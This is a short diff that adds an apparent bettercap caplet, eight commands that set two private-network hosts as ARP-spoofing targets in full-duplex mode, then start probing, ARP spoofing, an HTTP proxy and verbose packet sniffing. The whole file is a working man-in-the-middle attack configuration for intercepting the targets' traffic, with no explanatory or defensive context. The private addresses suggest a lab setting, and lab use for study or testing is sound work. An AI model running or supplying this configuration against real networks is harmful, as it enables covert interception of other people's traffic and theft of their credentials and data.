@@ -1,0 +1,8 @@
+set arp.spoof.targets 172.20.0.10,172.20.0.20
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+set net.sniff.verbose true
+net.probe on
+arp.spoof on
+http.proxy on
+net.sniff on
